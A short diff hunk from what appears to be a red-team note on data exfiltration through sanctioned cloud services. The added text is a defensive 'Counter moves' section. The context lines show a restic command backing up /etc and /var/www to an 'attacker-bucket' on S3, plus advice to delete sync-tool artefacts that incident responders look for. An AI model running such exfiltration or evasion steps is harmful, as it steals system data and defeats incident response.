@@ -114,3 +114,7 @@ restic -r s3:https://s3.amazonaws.com/attacker-bucket backup /etc /var/www --qui
   Drive account cannot be blocked without blocking all consumer OneDrive traffic
 - Clean up sync tool configuration files after use; these are artefacts that
   incident responders look for
+
+## Counter moves
+
+Routing data out through sanctioned cloud services hides it inside expected destinations. Proxy and CASB logging of cloud-storage endpoints, plus upload-volume anomalies, are the usual catch. The defender's view is in the blue notes on [watching the exits](https://blue.tymyrddin.dev/docs/counter/exfiltration/).
